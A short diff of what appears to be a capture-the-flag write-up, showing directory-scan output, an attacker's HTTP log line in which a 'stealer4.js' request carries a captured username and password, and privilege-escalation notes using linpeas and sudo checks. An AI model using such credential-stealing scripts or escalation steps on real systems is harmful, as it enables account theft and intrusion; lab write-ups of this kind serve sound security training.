@@ -106,7 +106,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /logout.php           (Status: 302) [Size: 0] [--> login.php]                     
 /config.php           (Status: 200) [Size: 0]                                     
 /server-status        (Status: 403) [Size: 278] 
----
 
 <h1> Web Service Testing </h1>
 
@@ -120,7 +119,7 @@ log from http server
 10.10.240.147 - - [11/Jan/2024 03:53:19] "GET /stealer4.js?jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -
 
 <h2> PrivEscalation lateral moving </h2>
-
+--
 get access via ssh as jack run linpeas and get this
 
 ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
@@ -133,7 +132,6 @@ User jack may run the following commands on ubuntu:
 --remote-debugging-port
 jack@ubuntu:/opt$ ls
 capture.pcap  urgent.txt
-
 ---
 <h3> Analysing captured packet</h3>
   
